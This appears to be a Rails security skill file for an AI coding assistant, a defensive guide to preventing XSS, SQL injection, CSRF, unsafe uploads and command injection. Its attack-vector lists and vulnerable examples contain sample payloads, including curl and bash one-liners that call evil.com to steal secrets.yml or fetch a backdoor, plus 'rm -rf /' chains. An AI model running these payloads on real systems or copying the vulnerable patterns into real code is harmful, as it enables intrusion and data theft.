---
name: rails-ai:security
description: CRITICAL - Use when securing Rails applications - XSS, SQL injection, CSRF, file uploads, command injection prevention
---

# Rails Security

Prevent critical security vulnerabilities in Rails applications: XSS, SQL injection, CSRF, file uploads, and command injection.

<when-to-use>
- Displaying ANY user-generated content
- Writing database queries with user input
- Building forms and AJAX requests
- Accepting file uploads from users
- Executing system commands
- Implementing authentication/authorization
- Reviewing code for security vulnerabilities
- Planning features that touch sensitive data
- ALWAYS - Security is ALWAYS required
</when-to-use>

<team-rules-enforcement>
**This skill enforces:**
- ✅ **Rule #16:** NEVER allow command injection → Use array args for system()
- ✅ **Rule #17:** NEVER skip file upload validation → Validate type, size, sanitize filenames

**Reject any requests to:**
- Skip input validation
- Use unsafe string interpolation in SQL
- Skip file upload security measures
- Use eval() or system() with user input
- Skip CSRF protection
</team-rules-enforcement>

<verification-checklist>
Before completing security-critical features:
- ✅ All user input validated and sanitized
- ✅ SQL injection prevented (parameterized queries)
- ✅ XSS prevented (proper escaping, CSP)
- ✅ CSRF tokens present on all forms
- ✅ File uploads validated (type, size, content)
- ✅ Command injection prevented (array args)
- ✅ Strong parameters used for all mass assignment
- ✅ Security tests passing
</verification-checklist>

<standards>
**XSS Prevention:**
- NEVER use `html_safe` or `raw` on user input
- Rails auto-escapes by default - rely on this
- Use `sanitize` with explicit allowlist for rich content
- Implement Content Security Policy (CSP) headers

**SQL Injection Prevention:**
- NEVER use string interpolation in SQL queries
- Use hash conditions: `where(name: value)`
- Use placeholders: `where("name = ?", value)`
- Use `sanitize_sql_like` for LIKE queries

**CSRF Protection:**
- Rails enables CSRF protection by default
- ALWAYS include `csrf_meta_tags` in layout
- Use `form_with` (includes token automatically)
- Include CSRF token in JavaScript requests

**File Upload Security:**
- NEVER trust user-provided filenames
- PREFER ActiveStorage over manual file handling
- VALIDATE by content type, extension, AND magic bytes
- STORE files outside public directory
- FORCE download for untrusted file types

**Command Injection Prevention:**
- NEVER interpolate user input in system commands
- ALWAYS use array form: `system("cmd", arg1, arg2)`
- PREFER Ruby methods over shell commands
- VALIDATE input with strict allowlists
</standards>

## XSS (Cross-Site Scripting) Prevention

<attack-vectors>
- **Script Injection** - `<script>alert('XSS')</script>`
- **Event Handlers** - `<img src=x onerror="alert('XSS')">`
- **JavaScript URLs** - `<a href="javascript:alert('XSS')">Click</a>`
- **SVG Injection** - `<svg onload="alert('XSS')"></svg>`
- **Data URIs** - `<img src="data:text/html,<script>alert('XSS')</script>">`
</attack-vectors>

### Rails Auto-Escaping

<pattern name="default-protection">
<description>Rails automatically escapes output in ERB templates</description>

```erb
<%# SECURE - Rails auto-escapes %>
<div class="content">
  <%= @feedback.content %>
</div>

```

**Attack Input:** `<script>alert('XSS')</script>`

**Safe Output:** `&lt;script&gt;alert('XSS')&lt;/script&gt;`

Browser displays the text, doesn't execute it.
</pattern>

### Sanitizing User Content

<pattern name="sanitize-with-allowlist">
<description>Allow specific HTML tags while stripping dangerous content</description>

```erb
<%# Allow only specific tags %>
<%= sanitize(@feedback.content,
    tags: %w[p br strong em a ul ol li],
    attributes: %w[href title]) %>

```

**Input:** `<p>Hello <strong>world</strong></p><script>alert('XSS')</script>`

**Output:** `<p>Hello <strong>world</strong></p>` (script stripped)
</pattern>

### Content Security Policy

<pattern name="csp-configuration">
<description>Implement Content Security Policy to block inline scripts</description>

```ruby
# config/initializers/content_security_policy.rb
Rails.application.config.content_security_policy do |policy|
  policy.default_src :self, :https
  policy.font_src :self, :https, :data
  policy.img_src :self, :https, :data
  policy.frame_ancestors :none
  policy.object_src :none
  policy.script_src :self, :https
  policy.style_src :self, :https
  policy.report_uri "/csp-violation-report"
end

Rails.application.config.content_security_policy_nonce_generator = ->(request) {
  SecureRandom.base64(16)
}
Rails.application.config.content_security_policy_nonce_directives = %w[script-src]

```

**View with Nonce:**

```erb
<%= javascript_tag nonce: true do %>
  console.log('This is allowed');
<% end %>

```

**CSP Violation Reporting:**

```ruby
# app/controllers/csp_reports_controller.rb
class CspReportsController < ApplicationController
  skip_before_action :verify_authenticity_token

  def create
    violation = JSON.parse(request.body.read)["csp-report"]
    Rails.logger.warn(
      "CSP Violation: document-uri=#{violation['document-uri']} " \
      "blocked-uri=#{violation['blocked-uri']}"
    )
    head :no_content
  end
end

```

**Why CSP:** Blocks XSS even if malicious script reaches the page, defense-in-depth strategy.
</pattern>

### ViewComponent Safety

<pattern name="viewcomponent-escaping">
<description>ViewComponents automatically escape content</description>

```ruby
# app/components/user_comment_component.rb
class UserCommentComponent < ViewComponent::Base
  def initialize(comment:)
    @comment = comment
  end

  private
  attr_reader :comment
end

```

```erb
<%# app/components/user_comment_component.html.erb %>
<div class="comment">
  <div class="author"><%= comment.author_name %></div>
  <div class="content"><%= comment.content %></div>
</div>

```

**Benefits:** Automatic escaping, encapsulated logic, testable, no accidental `html_safe`.
</pattern>

### Markdown Rendering

<pattern name="markdown-safe-rendering">
<description>Safely render markdown user content</description>

```ruby
# app/models/feedback.rb
class Feedback < ApplicationRecord
  def content_html
    markdown = Redcarpet::Markdown.new(
      Redcarpet::Render::HTML.new(
        filter_html: true, no_styles: true, safe_links_only: true
      ),
      autolink: true, tables: true, fenced_code_blocks: true
    )

    html = markdown.render(content)
    ActionController::Base.helpers.sanitize(
      html,
      tags: %w[p br strong em a ul ol li pre code h1 h2 h3 blockquote],
      attributes: %w[href title]
    )
  end
end

```

**View:**

```erb
<div class="markdown-content">
  <%= @feedback.content_html.html_safe %>
</div>

```

**Why Safe:** Markdown filtered for HTML, output sanitized with allowlist, double protection layer.
</pattern>

<antipattern>
<description>Using html_safe on user input</description>
<reason>Allows malicious script execution - CRITICAL vulnerability</reason>

<bad-example>

```erb
<%# CRITICAL VULNERABILITY %>
<%= @comment.html_safe %>
<%= raw(@feedback.content) %>

```
</bad-example>

<good-example>

```erb
<%# SECURE - Auto-escaped or sanitized %>
<%= @comment %>
<%= sanitize(@feedback.content, tags: %w[p br strong em]) %>

```
</good-example>
</antipattern>

## SQL Injection Prevention

<attack-vectors>
- **Authentication Bypass** - `' OR '1'='1`
- **Data Theft** - `' UNION SELECT * FROM users --`
- **Data Modification** - `'; UPDATE users SET admin=true --`
- **Data Deletion** - `'; DROP TABLE users --`
</attack-vectors>

### Secure Query Patterns

<pattern name="hash-conditions">
<description>Use hash conditions for simple equality checks (RECOMMENDED)</description>

```ruby
# ✅ SECURE - ActiveRecord escapes automatically
Project.where(name: params[:name])
User.find_by(login: params[:login])

# ✅ SECURE - Multiple conditions
Project.where(name: params[:name], status: params[:status], user_id: current_user.id)

# ✅ SECURE - IN queries (works with arrays)
Project.where(id: params[:ids])

```

**Why Secure:** ActiveRecord automatically escapes values and prevents injection.
</pattern>

<pattern name="positional-placeholders">
<description>Use ? placeholders for complex queries</description>

```ruby
# ✅ SECURE - Single placeholder
Project.where("name = ?", params[:name])
Project.where("created_at > ?", 1.week.ago)

# ✅ SECURE - Multiple placeholders
User.where("login = ? AND status = ? AND created_at > ?",
  params[:login], "active", 1.month.ago)

# ✅ SECURE - Complex conditions
Feedback.where("status = ? AND (priority = ? OR created_at < ?)",
  params[:status], "high", 1.day.ago)

```

**Why Secure:** Rails escapes each parameter value, preventing injection.
</pattern>

<pattern name="like-queries-safe">
<description>Safely handle LIKE queries with wildcards</description>

```ruby
# ✅ SECURE - Escape special LIKE characters (% -> \%, _ -> \_)
search_term = Book.sanitize_sql_like(params[:title])
Book.where("title LIKE ?", "#{search_term}%")

# ✅ SECURE - Case-insensitive search
search_term = Book.sanitize_sql_like(params[:query])
Book.where("LOWER(title) LIKE LOWER(?)", "%#{search_term}%")

```

**Why Sanitize:** Without `sanitize_sql_like`, users could inject `%` or `_` wildcards.
</pattern>

<antipattern>
<description>Using string interpolation in queries</description>
<reason>CRITICAL - Allows arbitrary SQL injection</reason>

<bad-example>

```ruby
# ❌ CRITICAL VULNERABILITY
Project.where("name = '#{params[:name]}'")
# Attack: params[:name] = "' OR '1'='1" - Returns ALL projects

User.find_by("login = '#{params[:login]}' AND password = '#{params[:password]}'")
# Attack: params[:login] = "admin'--" - Bypasses password check

# ❌ CRITICAL - Data exfiltration
Project.where("id = #{params[:id]}")
# Attack: params[:id] = "1 UNION SELECT id,email,password,1,1 FROM users"

```
</bad-example>

<good-example>

```ruby
# ✅ SECURE - Use placeholders
Project.where("name = ?", params[:name])
User.find_by("login = ? AND password = ?", params[:login], params[:password])

# ✅ BETTER - Use hash conditions
Project.where(name: params[:name])
User.find_by(login: params[:login], password: params[:password])

# ✅ SECURE - Type conversion prevents injection
Project.where(id: params[:id].to_i)

```
</good-example>
</antipattern>

### Dynamic ORDER BY Clauses

<pattern name="order-by-allowlist">
<description>Safely build ORDER BY from user input with allowlist</description>

```ruby
# ✅ SECURE - Allowlist approach
ALLOWED_SORT_COLUMNS = %w[name created_at status priority].freeze
ALLOWED_DIRECTIONS = %w[ASC DESC].freeze

def index
  column = ALLOWED_SORT_COLUMNS.include?(params[:sort]) ? params[:sort] : "created_at"
  direction = ALLOWED_DIRECTIONS.include?(params[:direction]&.upcase) ? params[:direction] : "DESC"

  @projects = Project.order("#{column} #{direction}")
end

```

**Why Secure:** User input limited to predefined safe values, SQL injection impossible.
</pattern>

<antipattern>
<description>Building ORDER BY from user input</description>
<reason>Allows column enumeration and SQL injection</reason>

<bad-example>

```ruby
# ❌ VULNERABLE
Project.order("#{params[:sort]} #{params[:direction]}")
# Attack: params[:sort] = "name); DROP TABLE projects; --"

```
</bad-example>

<good-example>

```ruby
# ✅ SECURE - Allowlist only
allowed = %w[name created_at]
column = allowed.include?(params[:sort]) ? params[:sort] : "created_at"
Project.order(column)

```
</good-example>
</antipattern>

### ActiveRecord Query Methods

<pattern name="activerecord-query-methods">
<description>Use ActiveRecord methods for automatic protection</description>

```ruby
# ✅ SECURE - All ActiveRecord methods are safe
Project.find(params[:id])
Project.find_by(name: params[:name])
Project.where(status: params[:status])
Project.order(:created_at)
Project.limit(10)
Project.offset(params[:page].to_i * 10)
Project.joins(:user)
Project.includes(:comments)
Project.group(:category)
Project.having("COUNT(*) > ?", 5)

# ✅ SECURE - Scopes
class Project < ApplicationRecord
  scope :active, -> { where(status: "active") }
  scope :by_user, ->(user_id) { where(user_id: user_id) }
  scope :search, ->(term) {
    sanitized = sanitize_sql_like(term)
    where("name LIKE ?", "%#{sanitized}%")
  }
end

Project.active.by_user(params[:user_id]).search(params[:query])

```

**Why Secure:** ActiveRecord automatically escapes all parameters.
</pattern>

## CSRF (Cross-Site Request Forgery) Protection

<attack-vectors>
- **Hidden Form Attack** - Malicious site auto-submits form to your app
- **Image Tag Attack** - `<img src="https://yourapp.com/account/delete">`
- **AJAX Attack** - JavaScript fetch/XHR to your endpoints
- **Auto-Submit Form** - JavaScript automatically submits hidden form
</attack-vectors>

### Rails Default Protection

<pattern name="default-csrf-protection">
<description>Rails enables CSRF protection by default</description>

```ruby
# app/controllers/application_controller.rb
class ApplicationController < ActionController::Base
  protect_from_forgery with: :exception
  # Raises ActionController::InvalidAuthenticityToken if token invalid
end

```

**Why :exception is Best:** Makes failures visible, prevents silent bypasses, forces proper error handling.
</pattern>

### Form Protection

<pattern name="automatic-token-in-forms">
<description>form_with automatically includes CSRF token</description>

```erb
<%# ✅ SECURE - Token included automatically %>
<%= form_with model: @feedback do |form| %>
  <%= form.text_field :content %>
  <%= form.text_field :recipient_email %>
  <%= form.submit "Submit" %>
<% end %>

```

**Generated HTML:**

```html
<form action="/feedbacks" method="post">
  <input type="hidden" name="authenticity_token" value="SECURE_TOKEN">
  <input type="text" name="feedback[content]">
  <input type="submit" value="Submit">
</form>

```

**Why Secure:** Rails validates token matches session.
</pattern>

### JavaScript Protection

<pattern name="csrf-meta-tags">
<description>Include CSRF meta tags for JavaScript access</description>

```erb
<%# app/views/layouts/application.html.erb %>
<head>
  <title>My App</title>
  <%= csrf_meta_tags %>
</head>

```
</pattern>

<pattern name="fetch-with-csrf-token">
<description>Include CSRF token in fetch requests</description>

```javascript
// ✅ SECURE - Extract token from meta tag
const csrfToken = document.head.querySelector("meta[name=csrf-token]")?.content;

fetch("/feedbacks", {
  method: "POST",
  headers: {
    "Content-Type": "application/json",
    "X-CSRF-Token": csrfToken
  },
  body: JSON.stringify({
    feedback: { content: "test", recipient_email: "user@example.com" }
  })
});

```

**Why Secure:** Rails checks `X-CSRF-Token` header matches session token.
</pattern>

<antipattern>
<description>Skipping CSRF for session-based authentication</description>
<reason>CRITICAL - Allows attackers to perform actions as authenticated users</reason>

<bad-example>

```ruby
# ❌ CRITICAL VULNERABILITY
class FeedbacksController < ApplicationController
  skip_before_action :verify_authenticity_token

  def create
    @feedback = current_user.feedbacks.create!(feedback_params)
    redirect_to @feedback
  end
end

```
</bad-example>

<good-example>

```ruby
# ✅ SECURE - Keep CSRF protection enabled
class FeedbacksController < ApplicationController
  # protect_from_forgery inherited from ApplicationController

  def create
    @feedback = current_user.feedbacks.create!(feedback_params)
    redirect_to @feedback
  end
end

```
</good-example>
</antipattern>

### Rails Request.js Library

<pattern name="rails-request-js">
<description>Use @rails/request.js for automatic CSRF handling</description>

**Installation:**

```bash
npm install @rails/request.js

```

**Usage:**

```javascript
// ✅ SECURE - Token automatically included
import { post, patch, destroy } from '@rails/request.js'

await post('/feedbacks', {
  body: JSON.stringify({ feedback: { content: "test" } }),
  contentType: 'application/json',
  responseKind: 'json'
})

await patch('/feedbacks/123', {
  body: JSON.stringify({ feedback: { status: "reviewed" } })
})

await destroy('/feedbacks/123', { responseKind: 'json' })

```

**Why Recommended:** Automatic CSRF token handling, consistent API, Rails-aware error handling.
</pattern>

### API Endpoints

<pattern name="api-skip-csrf">
<description>Skip CSRF for stateless API endpoints with token auth</description>

```ruby
# app/controllers/api/v1/base_controller.rb
class Api::V1::BaseController < ApplicationController
  skip_before_action :verify_authenticity_token
  before_action :authenticate_api_token

  private

  def authenticate_api_token
    token = request.headers["Authorization"]&.split(" ")&.last
    @current_api_user = User.find_by(api_token: token)
    head :unauthorized unless @current_api_user
  end
end

```

**Why Skip CSRF for APIs:** API clients use Bearer tokens (not cookies), tokens must be explicitly sent, CSRF only affects cookie-based authentication.
</pattern>

### Error Handling

<pattern name="graceful-csrf-failure">
<description>Handle CSRF failures with user-friendly error messages</description>

```ruby
# app/controllers/application_controller.rb
class ApplicationController < ActionController::Base
  protect_from_forgery with: :exception

  rescue_from ActionController::InvalidAuthenticityToken do |exception|
    Rails.logger.warn(
      "CSRF failure: #{exception.message} IP: #{request.remote_ip} Path: #{request.fullpath}"
    )

    sign_out_user if user_signed_in?
    redirect_to root_path, alert: "Your session has expired. Please log in again."
  end

  private

  def sign_out_user
    cookies.delete(:user_token)
    reset_session
  end
end

```

**Why Important:** Users see helpful error, security events logged, stale sessions cleared.
</pattern>

### SameSite Cookies

<pattern name="samesite-cookies">
<description>Use SameSite cookie attribute for defense-in-depth</description>

```ruby
# config/initializers/session_store.rb
Rails.application.config.session_store :cookie_store,
  key: '_myapp_session',
  same_site: :lax,                    # Prevents CSRF from external sites
  secure: Rails.env.production?,      # HTTPS only in production
  httponly: true,                     # Not accessible via JavaScript
  expire_after: 24.hours

```

**SameSite Options:**
- `:lax` (RECOMMENDED) - Allows top-level navigation, blocks embedded requests
- `:strict` - Most secure, blocks ALL cross-site requests (may break OAuth)
- `:none` - Allows all cross-site requests (requires secure: true)

**Why Use SameSite:** Defense-in-depth complements CSRF tokens, blocks many attacks without token.
</pattern>

## Secure File Uploads

<attack-vectors>
- **Path Traversal** - `../../config/database.yml` overwrites config files
- **Malicious File Types** - `.exe`, `.php`, `.html` files containing malware
- **Content Type Spoofing** - File claims to be image but is script
- **Magic Bytes Bypass** - Extension doesn't match actual file type
- **XSS via SVG** - SVG files containing embedded JavaScript
- **Denial of Service** - Large files consuming disk/memory
</attack-vectors>

### ActiveStorage (Recommended)

<pattern name="activestorage-basic">
<description>Use ActiveStorage for automatic security handling</description>

**Model:**

```ruby
class Feedback < ApplicationRecord
  has_one_attached :screenshot
  has_many_attached :documents

  validates :screenshot,
    content_type: ["image/png", "image/jpeg", "image/gif"],
    size: { less_than: 5.megabytes }

  validates :documents,
    content_type: ["application/pdf", "text/plain"],
    size: { less_than: 10.megabytes }
end

```

**Controller:**

```ruby
class FeedbacksController < ApplicationController
  def create
    @feedback = Feedback.new(feedback_params)
    if @feedback.save
      redirect_to @feedback, notice: "Feedback created"
    else
      render :new, status: :unprocessable_entity
    end
  end

  private

  def feedback_params
    params.expect(feedback: [:content, :recipient_email, :screenshot, documents: []])
  end
end

```

**View:**

```erb
<%= form_with model: @feedback do |f| %>
  <%= f.file_field :screenshot, accept: "image/*" %>
  <%= f.file_field :documents, multiple: true, accept: ".pdf,.txt" %>
  <%= f.submit %>
<% end %>

```

**Why Secure:** Automatic filename sanitization, storage outside public/, signed URLs with expiration.
</pattern>

### File Type Validation

<pattern name="content-type-validation">
<description>Validate file types by content type, extension, AND magic bytes</description>

```ruby
class Feedback < ApplicationRecord
  has_one_attached :image
  validate :acceptable_image

  private

  def acceptable_image
    return unless image.attached?

    unless image.content_type.in?(%w[image/jpeg image/png image/gif])
      errors.add(:image, "must be a JPEG, PNG, or GIF")
    end

    unless image.filename.to_s.match?(/\.(jpe?g|png|gif)\z/i)
      errors.add(:image, "must have a valid extension")
    end

    unless valid_image_signature?
      errors.add(:image, "file signature doesn't match declared type")
    end

    if image.byte_size > 5.megabytes
      errors.add(:image, "must be less than 5MB")
    end
  end

  def valid_image_signature?
    image.open do |file|
      magic_bytes = file.read(8)
      return false unless magic_bytes
      # JPEG: FF D8 FF, PNG: 89 50 4E 47, GIF: 47 49 46 38
      magic_bytes[0..2] == "\xFF\xD8\xFF" ||
        magic_bytes[0..7] == "\x89PNG\r\n\x1A\n" ||
        magic_bytes[0..3] == "GIF8"
    end
  rescue => e
    Rails.logger.error("Image validation error: #{e.message}")
    false
  end
end

```

**Why Triple Validation:** Content-Type can be spoofed, extension can be faked, magic bytes verify actual format.
</pattern>

### Secure File Serving

<pattern name="controller-based-serving">
<description>Serve files via controller with proper security headers</description>

```ruby
class DownloadsController < ApplicationController
  before_action :authenticate_user!

  def show
    @feedback = Feedback.find(params[:feedback_id])
    head :forbidden and return unless can_download?(@feedback)

    @document = @feedback.documents.find(params[:id])
    send_data @document.download,
              filename: @document.filename.to_s.gsub(/[^\w.-]/, "_"),
              type: @document.content_type,
              disposition: "attachment"  # Force download, never inline
  end

  private

  def can_download?(feedback)
    feedback.user == current_user || current_user.admin?
  end
end

```

**Why Secure:** Authentication + authorization enforced, `Content-Disposition: attachment` prevents XSS.
</pattern>

### Dangerous File Types

<pattern name="dangerous-file-types">
<description>Force binary download for dangerous file types</description>

```ruby
# config/initializers/active_storage.rb
Rails.application.config.active_storage.content_types_to_serve_as_binary.tap do |types|
  types << "image/svg+xml"  # SVG with embedded JavaScript
  types << "text/html" << "application/xhtml+xml"  # HTML scripts
  types << "text/xml" << "application/xml"  # XML entities
  types << "application/javascript" << "text/javascript"
end

Rails.application.config.active_storage.content_types_allowed_inline = %w[
  image/png image/jpeg image/gif image/bmp image/webp application/pdf
]

```

**Why Important:** SVG/HTML files can contain JavaScript that executes when viewed, enabling XSS.
</pattern>

### File Size Limits

<pattern name="size-limits">
<description>Implement multiple layers of file size protection</description>

**Application-Wide:**

```ruby
# config/application.rb
config.active_storage.max_file_size = 100.megabytes

```

**Web Server (Nginx):**

```nginx
client_max_body_size 100M;

```

**Model-Specific:**

```ruby
class Feedback < ApplicationRecord
  has_one_attached :avatar
  has_many_attached :photos

  validates :avatar, size: { less_than: 2.megabytes }
  validates :photos, size: { less_than: 5.megabytes }, limit: { max: 10 }
end

```

**Why Multiple Layers:** Web server rejects huge uploads early, application-wide limit prevents resource exhaustion, model limits enforce business rules.
</pattern>

### Virus Scanning

<pattern name="virus-scanning-production">
<description>Scan uploaded files for malware in production</description>

**Setup:** `gem "clamby"` + ClamAV (`apt-get install clamav clamav-daemon`)

```ruby
class Feedback < ApplicationRecord
  has_one_attached :file
  validate :file_not_infected, if: -> { file.attached? }

  private

  def file_not_infected
    return unless Rails.env.production?
    file.open do |temp_file|
      unless Clamby.safe?(temp_file.path)
        errors.add(:file, "contains malware or virus")
        Rails.logger.warn("Malware detected: user_id=#{user_id}, filename=#{file.filename}")
      end
    end
  rescue Clamby::ClambyScanError => e
    Rails.logger.error("Virus scan failed: #{e.message}")
  end
end

```

**Why Critical:** Prevent viruses, ransomware, and malware from infecting users or servers.
</pattern>

### ActiveStorage Variants

<pattern name="safe-image-processing">
<description>Use ActiveStorage variants for secure image processing</description>

```ruby
class Feedback < ApplicationRecord
  has_one_attached :image

  def thumbnail
    image.variant(resize_to_limit: [100, 100], format: :png, saver: { quality: 85 })
  end

  def medium
    image.variant(resize_to_limit: [400, 400], format: :png)
  end
end

```

**View:**

```erb
<%= image_tag @feedback.thumbnail, alt: "Feedback screenshot" %>

```

**Why Secure:** Variants re-encode images (stripping metadata/exploits), format conversion prevents attacks.
</pattern>

<antipattern>
<description>Trusting user-provided filenames</description>
<reason>CRITICAL - Enables path traversal and file overwrite attacks</reason>

<bad-example>

```ruby
# ❌ CRITICAL VULNERABILITY
def upload
  filename = params[:file].original_filename
  File.open("uploads/#{filename}", "wb") { |f| f.write(params[:file].read) }
end
# Attack: filename = "../../config/database.yml" - Overwrites database config!

# ❌ CRITICAL - Serving from public directory
path = Rails.root.join("public/uploads/#{params[:file].original_filename}")
File.open(path, "wb") { |f| f.write(params[:file].read) }
# Attacker uploads malicious.html with <script> - XSS attack!

```
</bad-example>

<good-example>

```ruby
# ✅ SECURE - Use ActiveStorage
class Feedback < ApplicationRecord
  has_one_attached :file
end

# ✅ SECURE - Manual handling with sanitization
def upload
  safe_name = File.basename(params[:file].original_filename).gsub(/[^\w.-]/, "_")
  unique_name = "#{SecureRandom.uuid}_#{safe_name}"
  File.open(Rails.root.join("storage/uploads", unique_name), "wb") { |f| f.write(params[:file].read) }
end

```
</good-example>
</antipattern>

<antipattern>
<description>Only validating content type</description>
<reason>Content-Type header is easily spoofed by attackers</reason>

<bad-example>

```ruby
# ❌ VULNERABLE - Only checks Content-Type header
validates :image, content_type: ["image/jpeg", "image/png"]
# Attack: Upload malicious.php with Content-Type: image/jpeg

```
</bad-example>

<good-example>

```ruby
# ✅ SECURE - Triple validation: content type + extension + magic bytes
def acceptable_image
  return unless image.attached?

  unless image.content_type.in?(%w[image/jpeg image/png image/gif])
    errors.add(:image, "must be an image")
  end

  unless image.filename.to_s.match?(/\.(jpe?g|png|gif)\z/i)
    errors.add(:image, "invalid file extension")
  end

  image.open do |file|
    magic = file.read(8)
    unless magic&.start_with?("\xFF\xD8\xFF", "\x89PNG", "GIF8")
      errors.add(:image, "file signature invalid")
    end
  end
end

```
</good-example>
</antipattern>

## Command Injection Prevention

<attack-vectors>
- **Command Chaining** - `; rm -rf /` or `&& cat /etc/passwd`
- **Pipe Attacks** - `| curl evil.com/steal?data=$(cat secrets.yml)`
- **Background Execution** - `& malicious_script.sh`
- **Command Substitution** - `$(curl evil.com/backdoor.sh | bash)`
</attack-vectors>

### Secure Command Execution

<pattern name="array-arguments-recommended">
<description>Use array form of system() - RECOMMENDED approach</description>

```ruby
# ✅ SECURE - Array arguments prevent shell interpretation
system("/bin/echo", params[:filename])
# Input: "hello; rm -rf /" → printed literally, NOT executed

# ✅ SECURE - Image conversion
system("convert", params[:image], "output.jpg")

# ✅ SECURE - Archive creation
system("/bin/tar", "-czf", "backup.tar.gz", validated_directory)

# ✅ SECURE - Multiple arguments
system("wkhtmltopdf", "--quiet", "--page-size", "A4", input_file, output_file)

```

**How It Works:** Array arguments bypass shell invocation, treating user input as literal arguments only.
</pattern>

### Input Validation

<pattern name="input-validation-allowlist">
<description>Validate input with strict allowlists</description>

```ruby
# ✅ SECURE - Only allow predefined values
VALID_FORMATS = %w[pdf png jpg svg].freeze
VALID_SIZES = %w[small medium large].freeze

def export_feedback(feedback, format, size)
  unless VALID_FORMATS.include?(format)
    raise ArgumentError, "Invalid format: #{format}"
  end

  unless VALID_SIZES.include?(size)
    raise ArgumentError, "Invalid size: #{size}"
  end

  # Safe because format is from allowlist
  system("convert", "feedback.html", "output.#{format}")
end

```
</pattern>

### Ruby Alternatives (Preferred)

<pattern name="ruby-alternatives-preferred">
<description>Use Ruby methods instead of shell commands</description>

```ruby
# ❌ VULNERABLE - Shell command
system("rm #{params[:filename]}")

# ✅ SECURE - Ruby method
File.delete(params[:filename]) if File.exist?(params[:filename])

# ❌ VULNERABLE - Shell command
system("mkdir -p #{params[:directory]}")

# ✅ SECURE - Ruby method
FileUtils.mkdir_p(params[:directory])

# ❌ VULNERABLE - Shell command
system("cp #{params[:source]} #{params[:dest]}")

# ✅ SECURE - Ruby method
FileUtils.cp(params[:source], params[:dest])

```

**Why Prefer Ruby:** No shell interpretation = no injection risk, better error handling.
</pattern>

### Shellwords Escaping

<pattern name="shellwords-escaping">
<description>Use Shellwords.escape when array form not possible</description>

```ruby
require "shellwords"

# ✅ SECURE - Escape user input for shell safety
filename = Shellwords.escape(params[:filename])
system("convert input.jpg #{filename}")

# ✅ SECURE - Multiple arguments
args = [params[:input], params[:output]].map { |arg| Shellwords.escape(arg) }.join(" ")
system("convert #{args} -resize 800x600")

```

**How Shellwords Works:**

```ruby
Shellwords.escape("file.jpg")           # => "file.jpg"
Shellwords.escape("file; rm -rf /")     # => "file\\;\\ rm\\ -rf\\ /"
Shellwords.escape("$(cat /etc/passwd)") # => "\\$\\(cat\\ /etc/passwd\\)"

```

**When to Use:** Only when array form is truly not possible. Prefer array form whenever available.
</pattern>

### Path Validation

<pattern name="path-validation">
<description>Prevent directory traversal in file paths</description>

```ruby
# ✅ SECURE - Validate path stays within directory
def safe_file_path(user_input)
  base_dir = Rails.root.join("uploads")
  full_path = base_dir.join(user_input).expand_path

  raise ArgumentError, "Invalid path: directory traversal" unless full_path.to_s.start_with?(base_dir.to_s)
  full_path
end

# Usage
file_path = safe_file_path(params[:file])
send_file file_path if File.exist?(file_path)

```

**Why Important:** Prevents access to files outside intended directory.
</pattern>

### Background Job Isolation

<pattern name="background-job-isolation">
<description>Isolate system commands in background jobs with strict validation</description>

```ruby
class PdfGenerationJob < ApplicationJob
  def perform(feedback_id, output_path)
    feedback = Feedback.find(feedback_id)
    validate_output_path!(output_path)

    success = system(
      "wkhtmltopdf", "--quiet", "--page-size", "A4",
      "--disable-javascript", feedback.public_url, output_path
    )

    raise "PDF generation failed" unless success
    PdfMailer.with(feedback: feedback, pdf_path: output_path).ready.deliver_later
  end

  private

  def validate_output_path!(path)
    raise ArgumentError, "Invalid output path" unless path.match?(/\Atmp\/feedback_\d+\.pdf\z/)

    full_path = Rails.root.join(path).expand_path
    allowed_dir = Rails.root.join("tmp").expand_path
    raise ArgumentError, "Path outside allowed directory" unless full_path.to_s.start_with?(allowed_dir.to_s)
  end
end

```

**Why Isolate:** Limits blast radius, easier to audit, validation in one place.
</pattern>

<antipattern>
<description>Using backticks for command execution</description>
<reason>CRITICAL - Allows command injection through shell interpretation</reason>

<bad-example>

```ruby
# ❌ CRITICAL VULNERABILITY
output = `ls #{params[:path]}`
# Attack: "/; cat /etc/passwd" → Directory listing AND password exposure

result = %x(convert #{params[:input]} output.png)
# Attack: "file.jpg; wget evil.com/malware"

system("convert #{params[:input]} -resize #{params[:size]} output.jpg")
# Attack: params[:size] = "800x600; curl evil.com/backdoor.sh | bash"

```
</bad-example>

<good-example>

```ruby
# ✅ SECURE - Use array form and capture output
require "open3"
validate_path!(params[:path])
output, status = Open3.capture2("ls", params[:path])

# ✅ SECURE - Array form with validation
raise ArgumentError unless params[:input].match?(/\A[\w.-]+\z/)
system("convert", params[:input], "output.png")

# ✅ SECURE - Validate size format
raise ArgumentError unless params[:size].match?(/\A\d{1,4}x\d{1,4}\z/)
system("convert", params[:input], "-resize", params[:size], "output.jpg")

```
</good-example>
</antipattern>

<antipattern>
<description>Not validating file paths for directory traversal</description>
<reason>HIGH - Allows access to files outside intended directory</reason>

<bad-example>

```ruby
# ❌ VULNERABLE - Directory traversal
file_path = Rails.root.join("uploads", params[:file])
send_file file_path
# Attack: params[:file] = "../../../etc/passwd"

```
</bad-example>

<good-example>

```ruby
# ✅ SECURE - Validate path stays within directory
base_dir = Rails.root.join("uploads")
file_path = base_dir.join(params[:file]).expand_path
raise ArgumentError, "Invalid file path" unless file_path.to_s.start_with?(base_dir.to_s)
send_file file_path if File.exist?(file_path)

```
</good-example>
</antipattern>

## Testing Security Patterns

<testing>

```ruby
# test/models/feedback_test.rb
class FeedbackTest < ActiveSupport::TestCase
  # XSS Prevention
  test "content_html sanitizes malicious scripts" do
    feedback = Feedback.new(content: "<script>alert('XSS')</script>Hello")
    assert_not_includes feedback.content_html, "<script>"
    assert_includes feedback.content_html, "Hello"
  end

  test "content_html allows safe markdown" do
    feedback = Feedback.new(content: "**bold** and *italic*")
    assert_includes feedback.content_html, "<strong>bold</strong>"
    assert_includes feedback.content_html, "<em>italic</em>"
  end

  # SQL Injection Prevention
  test "search handles malicious input safely" do
    project = projects(:one)
    malicious_input = "'; DROP TABLE projects; --"

    assert_nothing_raised { Project.search(malicious_input) }
    assert Project.exists?(project.id)
  end

  test "search escapes LIKE wildcards" do
    projects(:one).update!(name: "Project A")
    results = Project.search("%")

    assert_empty results  # % should be escaped, not treated as wildcard
  end

  # File Upload Security
  test "accepts valid image" do
    feedback = Feedback.new(content: "Test", recipient_email: "user@example.com")
    feedback.image.attach(io: File.open("test/fixtures/files/valid.jpg"),
                          filename: "valid.jpg", content_type: "image/jpeg")
    assert feedback.valid?
    assert feedback.image.attached?
  end

  test "rejects invalid content type" do
    feedback = Feedback.new(content: "Test")
